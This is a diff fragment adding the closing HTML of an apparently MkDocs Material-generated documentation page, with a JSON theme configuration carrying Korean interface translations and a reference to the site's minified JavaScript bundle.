+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "search.highlight", "content.code.copy"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\ud074\ub9bd\ubcf4\ub4dc\uc5d0 \ubcf5\uc0ac\ub428", "clipboard.copy": "\ud074\ub9bd\ubcf4\ub4dc\ub85c \ubcf5\uc0ac", "search.result.more.one": "\uc774 \ubb38\uc11c\uc5d0\uc11c 1\uac1c\uc758 \uac80\uc0c9 \uacb0\uacfc \ub354 \ubcf4\uae30", "search.result.more.other": "\uc774 \ubb38\uc11c\uc5d0\uc11c #\uac1c\uc758 \uac80\uc0c9 \uacb0\uacfc \ub354 \ubcf4\uae30", "search.result.none": "\uac80\uc0c9\uc5b4\uc640 \uc77c\uce58\ud558\ub294 \ubb38\uc11c\uac00 \uc5c6\uc2b5\ub2c8\ub2e4", "search.result.one": "1\uac1c\uc758 \uc77c\uce58\ud558\ub294 \ubb38\uc11c", "search.result.other": "#\uac1c\uc758 \uc77c\uce58\ud558\ub294 \ubb38\uc11c", "search.result.placeholder": "\uac80\uc0c9\uc5b4\ub97c \uc785\ub825\ud558\uc138\uc694", "search.result.term.missing": "\ud3ec\ud568\ub418\uc9c0 \uc54a\uc740 \uac80\uc0c9\uc5b4", "select.version": "\ubc84\uc804 \uc120\ud0dd"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
